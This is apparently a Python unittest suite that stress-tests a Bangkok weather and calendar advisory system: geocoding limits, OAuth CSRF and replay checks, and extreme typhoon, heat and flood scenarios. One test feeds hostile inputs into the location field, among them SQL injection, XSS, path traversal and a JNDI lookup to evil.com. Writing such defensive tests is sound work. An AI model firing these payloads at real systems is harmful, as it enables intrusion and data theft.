#!/usr/bin/env python3
"""
Bangkok Weather Resilience & Disaster Preparedness System
Tier 5 Adversarial Coverage Hardening Suite (Challenger M6-2)

Empirical stress testing of:
1. Geocoding & Landmark Normalization (100KB strings, Zalgo, SQLi/XSS, Non-Bangkok)
2. OAuth & TokenStore (CSRF tampering, expired tokens, concurrent refresh, Redis drops)
3. Proactive Shift Reasoner (Cat 5 typhoon, 52°C heatwave, 120cm flood, corrupted metrics)
4. Calendar Weather Matcher edge cases (missing coordinates, negative values, outdoor flags)
"""

import unittest
import sys
import os
import time
import json
import string
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from unittest.mock import MagicMock, patch

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from engine.collectors.google_calendar import (
    GoogleCalendarCollector,
    GoogleOAuthManager,
    TokenStore,
    geocode_bangkok_location,
    BANGKOK_PLACES_GEOCODE
)
from engine.geospatial.calendar_matcher import CalendarWeatherMatcher
from engine.ai.gemini_reasoner import GeminiWeatherReasoner
from engine.main import sync_and_evaluate_calendar, CalendarSyncRequest


class TestGeocodingAdversarial(unittest.TestCase):
    """Suite 1: Geocoding & Landmark Normalization Adversarial Stress"""

    BKK_LAT_MIN = 13.40
    BKK_LAT_MAX = 14.20
    BKK_LNG_MIN = 100.30
    BKK_LNG_MAX = 100.90

    def assert_in_bangkok_bounds(self, lat: float, lng: float, msg: str = ""):
        self.assertTrue(
            self.BKK_LAT_MIN <= lat <= self.BKK_LAT_MAX,
            f"Lat {lat} out of bounds [{self.BKK_LAT_MIN}, {self.BKK_LAT_MAX}]. {msg}"
        )
        self.assertTrue(
            self.BKK_LNG_MIN <= lng <= self.BKK_LNG_MAX,
            f"Lng {lng} out of bounds [{self.BKK_LNG_MIN}, {self.BKK_LNG_MAX}]. {msg}"
        )

    def test_dos_amplification_in_geocoding_defect_empirical(self):
        """
        Defect Demonstration (D3) Remediation Verification:
        Algorithmic Complexity / DoS in geocode_bangkok_location Pass 3.
        When an un-matched 100KB string is passed, Pass 3 is bounded by 500-char input truncation
        and token length/count bounding (first 20 tokens, len 4..40), completing in < 0.10s (sub-millisecond)
        instead of unconstrained 5-11 seconds of single-threaded Python CPU time.
        """
        continuous_100kb = "xyz_non_bangkok_text_" * 4800
        start = time.perf_counter()
        result = geocode_bangkok_location(continuous_100kb)
        elapsed = time.perf_counter() - start

        # Empirically proves that bounded geocoding evaluates safely and quickly under 100ms
        self.assertLess(elapsed, 0.10, f"Expected bounded geocoding to take <100ms, took {elapsed:.2f}s")
        self.assertIn("lat", result)
        self.assertIn("lng", result)
        self.assert_in_bangkok_bounds(result["lat"], result["lng"])
        self.assertEqual(result["match_type"], "fallback_city_center")

    def test_bounded_geocoding_performance(self):
        """Verify standard long address (under 300 chars) evaluates quickly under 50ms."""
        standard_long_loc = "อาคารสำนักงานชั้น 25 เลขที่ 999 ถนนพระราม 4 แขวงคลองเตย เขตคลองเตย กรุงเทพมหานคร 10110"
        start = time.perf_counter()
        result = geocode_bangkok_location(standard_long_loc)
        elapsed = time.perf_counter() - start

        self.assertLess(elapsed, 0.10, f"Standard address took too long: {elapsed:.2f}s")
        self.assert_in_bangkok_bounds(result["lat"], result["lng"])

    def test_extreme_unicode_and_zalgo(self):
        """Stress: Zalgo text, zero-width joiners, bidirectional overrides, multi-byte emojis."""
        zalgo_payload = "ส\u0300\u0301\u0302\u0303\u0304\u0305ย\u0306\u0307\u0308\u0309า\u030A\u030B\u030C\u030Dม ⛈️🌊🚗🔥 \u200E\u200F\u202A\u202E"
        result = geocode_bangkok_location(zalgo_payload)

        self.assertIn("lat", result)
        self.assertIn("lng", result)
        self.assert_in_bangkok_bounds(result["lat"], result["lng"])

    def test_non_bangkok_and_exotic_locations(self):
        """Stress: Locations clearly outside Bangkok (Tokyo, London, Chiang Mai, South Pole)."""
        exotic_locations = [
            "Tokyo Station, Chiyoda City, Tokyo, Japan",
            "Times Square, New York, NY 10036, USA",
            "ท่าอากาศยานเชียงใหม่ ต.สุเทพ อ.เมือง จ.เชียงใหม่",
            "Amundsen-Scott South Pole Station, Antarctica",
            "ภูเก็ตแฟนตาซี ต.กมลา อ.กะทู้ จ.ภูเก็ต",
            "ดอยอินทนนท์ อ.จอมทอง เชียงใหม่"
        ]
        for loc in exotic_locations:
            res = geocode_bangkok_location(loc)
            # Must safely fall back to Bangkok reference coordinates without error
            self.assert_in_bangkok_bounds(res["lat"], res["lng"], f"Location: {loc}")
            self.assertEqual(res["match_type"], "fallback_city_center")

    def test_injection_payloads_in_location(self):
        """Stress: SQL Injection and XSS attack strings inside location field."""
        attack_payloads = [
            "'; DROP TABLE events; --",
            "' UNION SELECT username, password FROM users --",
            "<script>alert('XSS_ATTACK_VECTOR')</script>",
            "\" onmouseover=\"alert('xss')\"",
            "{{ 7 * 7 }}",
            "${jndi:ldap://evil.com/a}",
            "../../../../etc/passwd",
            "%00%00%00%00"
        ]
        for payload in attack_payloads:
            res = geocode_bangkok_location(payload)
            self.assert_in_bangkok_bounds(res["lat"], res["lng"], f"Payload: {payload}")
            self.assertIn("lat", res)
            self.assertIn("lng", res)
            self.assertIsInstance(res["lat"], (int, float))
            self.assertIsInstance(res["lng"], (int, float))


class TestOAuthTokenStoreAdversarial(unittest.TestCase):
    """Suite 2: OAuth & TokenStore Resilience"""

    def setUp(self):
        self.store = TokenStore()
        self.oauth_manager = GoogleOAuthManager(token_store=self.store)

    def test_csrf_state_tampering(self):
        """Attack: Attacker modifies or creates fake state parameter."""
        _, legit_state = self.oauth_manager.generate_auth_url("U_VICTIM")

        tampered_state = legit_state[:-4] + "HACK"
        with self.assertRaises(ValueError) as ctx:
            self.oauth_manager.exchange_code("mock_code_123", tampered_state)
        self.assertIn("CSRF detected", str(ctx.exception))

    def test_replay_attack_on_state(self):
        """Attack: Replaying the same authorization code and state token."""
        _, legit_state = self.oauth_manager.generate_auth_url("U_REPLAY")

        # First exchange succeeds
        tokens1 = self.oauth_manager.exchange_code("mock_code_123", legit_state)
        self.assertIsNotNone(tokens1)

        # Second exchange with same state must fail (state was popped)
        with self.assertRaises(ValueError) as ctx:
            self.oauth_manager.exchange_code("mock_code_123", legit_state)
        self.assertIn("CSRF detected", str(ctx.exception))

    def test_expired_state_token(self):
        """Boundary: State token TTL expiration (simulate time forward)."""
        state = "state_will_expire"
        self.store.save_state(state, {"user_id": "U_EXP"}, ttl_seconds=1)

        # Fast forward
        with self.store._lock:
            self.store._states[state]["_expires_at"] = time.time() - 10

        val = self.store.pop_state(state)
        self.assertIsNone(val, "Expired state was not rejected by pop_state")

    def test_expired_access_token_auto_refresh(self):
        """Workflow: Expired access token triggers automatic refresh via refresh_token."""
        user_id = "U_EXP_ACCESS"
        expired_tokens = {
            "access_token": "expired_mock_token_abc",
            "refresh_token": "mock_refresh_token_xyz",
            "expires_at": time.time() - 300,  # Expired 5 mins ago
            "user_id": user_id
        }
        self.store.save_tokens(user_id, expired_tokens)

        # get_valid_access_token should detect expiration and refresh automatically
        valid_token = self.oauth_manager.get_valid_access_token(user_id)
        self.assertIsNotNone(valid_token)
        self.assertNotEqual(valid_token, "expired_mock_token_abc")
        self.assertTrue(valid_token.startswith("mock_refreshed_token_"))

    def test_concurrent_token_refresh_race(self):
        """Stress: 10 concurrent threads refreshing tokens simultaneously for same user."""
        user_id = "U_CONCURRENT_RACE"
        initial_tokens = {
            "access_token": "token_init",
            "refresh_token": "mock_refresh_token_race",
            "expires_at": time.time() - 100,
            "user_id": user_id
        }
        self.store.save_tokens(user_id, initial_tokens)

        results = []
        errors = []

        def worker():
            try:
                tok = self.oauth_manager.get_valid_access_token(user_id)
                results.append(tok)
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=worker) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(len(errors), 0, f"Concurrent refresh threw errors: {errors}")
        self.assertEqual(len(results), 10)
        for r in results:
            self.assertIsNotNone(r)
            self.assertTrue(r.startswith("mock_refreshed_token_"))

    def test_redis_connection_drop_resilience(self):
        """Resilience: Redis throwing ConnectionError / Timeout -> Store uses in-memory without crash."""
        faulty_store = TokenStore()

        # Mock Redis client that fails on every call
        mock_redis = MagicMock()
        mock_redis.get.side_effect = Exception("Redis connection refused (simulated network partition)")
        mock_redis.setex.side_effect = Exception("Redis connection timeout (simulated down)")
        mock_redis.delete.side_effect = Exception("Redis drop")
        faulty_store._redis_client = mock_redis

        # Operations must seamlessly fall back to memory
        faulty_store.save_state("state_redis_down", {"user_id": "U_REDIS_FAIL"}, ttl_seconds=600)
        popped = faulty_store.pop_state("state_redis_down")
        self.assertIsNotNone(popped)
        self.assertEqual(popped["user_id"], "U_REDIS_FAIL")

        faulty_store.save_tokens("U_REDIS_FAIL", {"access_token": "fallback_tok", "user_id": "U_REDIS_FAIL"})
        read_tokens = faulty_store.get_tokens("U_REDIS_FAIL")
        self.assertIsNotNone(read_tokens)
        self.assertEqual(read_tokens["access_token"], "fallback_tok")

        faulty_store.delete_tokens("U_REDIS_FAIL")
        self.assertIsNone(faulty_store.get_tokens("U_REDIS_FAIL"))


class TestProactiveShiftReasonerAdversarial(unittest.TestCase):
    """Suite 3: Proactive Shift Reasoner Under Extreme Vectors"""

    def setUp(self):
        self.matcher = CalendarWeatherMatcher()
        self.reasoner = GeminiWeatherReasoner()

    def test_extreme_category_5_typhoon(self):
        """Stress: Extreme rainfall 250 mm/h, wind 160 km/h."""
        event = {
            "event_id": "EVT_TYPHOON",
            "title": "เจรจาธุรกิจสำคัญ อาคารเสริมมิตร อโศก",
            "location_name": "อาคารเสริมมิตร ถ.อโศกมนตรี (วัฒนา)",
            "latitude": 13.7372,
            "longitude": 100.5638,
            "start_time": "2026-09-26T17:00:00+07:00",
            "is_outdoor": False
        }

        # Override mock weather with extreme typhoon
        with patch.object(self.matcher.weather, "get_hourly_forecast") as mock_fc:
            mock_fc.return_value = [{
                "precipitation_rate_mm_hr": 250.0,
                "heat_index_c": 28.0,
                "wind_gust_kmh": 160.0,
                "condition": "Severe Typhoon Cloudburst"
            }]

            evals = self.matcher.evaluate_calendar_events([event], transport_mode="compact_sedan")
            self.assertEqual(len(evals), 1)
            ev = evals[0]

            self.assertTrue(ev["has_weather_concern"])
            self.assertEqual(ev["urgency"], "CRITICAL")
            self.assertEqual(ev["recommended_action_type"], "MODAL_SHIFT")
            self.assertGreaterEqual(ev["recommended_early_departure_minutes"], 45)

            # Test Dual-Schema Reasoner
            adv = self.reasoner.generate_calendar_advisory(
                {"name": "คุณสมชาย", "transport_mode": "compact_sedan"},
                ev
            )
            # Verify Go Gateway DTO keys
            self.assertIn("headline", adv)
            self.assertIn("reasoning", adv)
            self.assertIn("proactive_recommendation", adv)
            self.assertIn("departure_adjustment_mins", adv)
            self.assertIn("recommended_action_type", adv)
            # Verify Thai Alert keys
            self.assertIn("title", adv)
            self.assertIn("urgency_level", adv)
            self.assertEqual(adv["urgency_level"], "CRITICAL")
            self.assertIn("action_checklist", adv)
            self.assertGreaterEqual(len(adv["action_checklist"]), 3)

    def test_extreme_heatwave_outdoor(self):
        """Stress: 0 mm/h rain but 52.0°C heat index outdoor activity."""
        event = {
            "event_id": "EVT_HEATWAVE",
            "title": "กอล์ฟกระชับมิตรผู้บริหารกลางแจ้ง",
            "location_name": "สนามกอล์ฟกรุงเทพกรีฑา (สะพานสูง)",
            "latitude": 13.7475,
            "longitude": 100.6698,
            "start_time": "2026-09-26T12:00:00+07:00",
            "is_outdoor": True
        }

        with patch.object(self.matcher.weather, "get_hourly_forecast") as mock_fc:
            mock_fc.return_value = [{
                "precipitation_rate_mm_hr": 0.0,
                "heat_index_c": 52.0,
                "wind_gust_kmh": 8.0,
                "condition": "Extreme Heatwave Danger"
            }]

            evals = self.matcher.evaluate_calendar_events([event], transport_mode="compact_sedan")
            self.assertEqual(len(evals), 1)
            ev = evals[0]

            self.assertTrue(ev["has_weather_concern"])
            self.assertEqual(ev["concern_type"], "EXTREME_HEAT_OUTDOOR")
            self.assertEqual(ev["recommended_action_type"], "REMOTE")  # Move indoors / reschedule

            adv = self.reasoner.generate_calendar_advisory(
                {"name": "คุณสมชาย", "transport_mode": "compact_sedan"},
                ev
            )
            self.assertIn("ฮีทสโตรก", adv["reasoning"] + adv["summary_text"])
            self.assertEqual(adv["recommended_action_type"], "REMOTE")

    def test_catastrophic_flood_depth(self):
        """Stress: Flood depth > 100 cm (e.g. 120 cm)."""
        event = {
            "event_id": "EVT_FLOOD_CATASTROPHIC",
            "title": "นัดพบลูกค้า ศูนย์ราชการแจ้งวัฒนะ",
            "location_name": "ศูนย์ราชการแจ้งวัฒนะ (หลักสี่)",
            "latitude": 13.8863,
            "longitude": 100.5658,
            "start_time": "2026-09-26T16:00:00+07:00",
            "is_outdoor": False
        }

        with patch.object(self.matcher.flood, "evaluate_user_risk") as mock_risk:
            mock_risk.return_value = {
                "risk_level": "SEVERE",
                "risk_score": 95,
                "flood_impact": {
                    "max_street_depth_cm": 120,
                    "matched_hotspots": [{"name_th": "ถนนแจ้งวัฒนะ", "district": "หลักสี่"}]
                }
            }

            evals = self.matcher.evaluate_calendar_events([event], transport_mode="compact_sedan")
            ev = evals[0]
            self.assertEqual(ev["urgency"], "CRITICAL")
            self.assertEqual(ev["recommended_action_type"], "MODAL_SHIFT")

            adv = self.reasoner.generate_calendar_advisory(
                {"name": "คุณสมชาย", "transport_mode": "compact_sedan"},
                ev
            )
            self.assertEqual(adv["recommended_action_type"], "MODAL_SHIFT")
            self.assertIn("120", adv["summary_text"] + adv["reasoning"])

    def test_corrupted_and_missing_weather_fields(self):
        """Robustness: Corrupted/empty/None weather metrics dict does not crash when coordinates are valid."""
        event = {
            "event_id": "EVT_CORRUPTED_METRICS",
            "title": "นัดหมายทดสอบ",
            "location_name": "สยามพารากอน",
            "latitude": 13.7460,
            "longitude": 100.5347,
            "start_time": "invalid_date_format",
            "is_outdoor": None
        }

        with patch.object(self.matcher.weather, "get_hourly_forecast") as mock_fc:
            mock_fc.return_value = [{}]  # Empty dict

            evals = self.matcher.evaluate_calendar_events([event], transport_mode="compact_sedan")
            self.assertEqual(len(evals), 1)
            ev = evals[0]
            self.assertIn("has_weather_concern", ev)
            self.assertIn("urgency", ev)

    def test_unhandled_coordinate_type_defect_empirical(self):
        """
        Defect Demonstration (D1) Remediation Verification:
        CalendarWeatherMatcher.evaluate_calendar_events safely handles None or non-numeric string
        (e.g. 'N/A' or 'invalid_lat') coordinates by falling back to Bangkok Center (13.7563, 100.5018)
        without raising TypeError or ValueError.
        """
        # Case A: latitude is None
        event_none_lat = {"latitude": None, "longitude": 100.50, "start_time": "2026-09-26T14:00:00"}
        evals_none = self.matcher.evaluate_calendar_events([event_none_lat])
        self.assertEqual(len(evals_none), 1)
        self.assertIn("has_weather_concern", evals_none[0])
        self.assertEqual(evals_none[0]["event"]["latitude"], None)

        # Case B: latitude is invalid string "invalid_lat"
        event_str_lat = {"latitude": "invalid_lat", "longitude": "100.50", "start_time": "2026-09-26T14:00:00"}
        evals_str = self.matcher.evaluate_calendar_events([event_str_lat])
        self.assertEqual(len(evals_str), 1)
        self.assertIn("has_weather_concern", evals_str[0])
        self.assertEqual(evals_str[0]["event"]["latitude"], "invalid_lat")

    def test_google_event_null_fields_defect_empirical(self):
        """
        Defect Demonstration (D2) Remediation Verification:
        GoogleCalendarCollector.parse_google_event safely handles JSON items with null values for
        location, description, or start without raising AttributeError.
        """
        collector = GoogleCalendarCollector()

        # Case A: description is None
        item_null_desc = {"id": "1", "summary": "Meeting", "location": "Asok", "start": {}, "description": None}
        ev_a = collector.parse_google_event(item_null_desc)
        self.assertEqual(ev_a["description"], "")
        self.assertEqual(ev_a["title"], "Meeting")

        # Case B: location is None
        item_null_loc = {"id": "2", "summary": "Meeting", "location": None, "start": {}, "description": "Notes"}
        ev_b = collector.parse_google_event(item_null_loc)
        self.assertEqual(ev_b["location_raw"], "")
        self.assertEqual(ev_b["title"], "Meeting")

        # Case C: start is None
        item_null_start = {"id": "3", "summary": "Meeting", "location": "Asok", "start": None, "description": "Notes"}
        ev_c = collector.parse_google_event(item_null_start)
        self.assertEqual(ev_c["start_time"], "")
        self.assertEqual(ev_c["title"], "Meeting")

    def test_liff_calendar_sync_reentrancy_guard_enhancement(self):
        """
        Enhancement Demonstration (E1) Remediation Verification:
        Verify that gateway/static/liff/index.html includes isCalendarSyncInProgress re-entrancy guard
        to prevent duplicate concurrent AJAX sync requests during rapid user clicking.
        """
        liff_path = PROJECT_ROOT / "gateway" / "static" / "liff" / "index.html"
        self.assertTrue(liff_path.exists(), "LIFF index.html does not exist")
        html_code = liff_path.read_text(encoding="utf-8")

        self.assertIn("isCalendarSyncInProgress", html_code)
        self.assertIn("if (isCalendarSyncInProgress) return;", html_code)
        self.assertIn("isCalendarSyncInProgress = true;", html_code)
        self.assertIn("isCalendarSyncInProgress = false;", html_code)


class TestFullEngineSyncAdversarial(unittest.TestCase):
    """Suite 4: End-to-End FastAPI Engine Sync Endpoint Stress"""

    def test_sync_and_evaluate_pipeline_stress(self):
        """Stress: Call sync_and_evaluate_calendar with diverse personas and check response integrity."""
        personas = [
            ("U1001", "คุณสมชาย", "compact_sedan"),
            ("U1002", "คุณสมหญิง", "motorcycle"),
            ("U1003", "คุณวิชัย", "pickup"),
            ("U1004", "คุณนภา", "pedestrian")
        ]

        for uid, name, mode in personas:
            req = CalendarSyncRequest(user_id=uid, name=name, transport_mode=mode)
            res = sync_and_evaluate_calendar(req)

            self.assertEqual(res["user_id"], uid)
            self.assertIn("total_events_checked", res)
            self.assertIn("events_with_weather_hazards", res)
            self.assertIn("evaluations", res)
            self.assertIn("proactive_advisories", res)

            # Check every advisory has dual schema keys
            for adv_item in res["proactive_advisories"]:
                adv = adv_item["advisory"]
                # Go Gateway DTO keys
                self.assertIn("headline", adv)
                self.assertIn("reasoning", adv)
                self.assertIn("proactive_recommendation", adv)
                self.assertIn("departure_adjustment_mins", adv)
                self.assertIn("recommended_action_type", adv)
                # Thai UI keys
                self.assertIn("title", adv)
                self.assertIn("urgency_level", adv)
                self.assertIn("summary_text", adv)
                self.assertIn("action_checklist", adv)


if __name__ == "__main__":
    unittest.main()
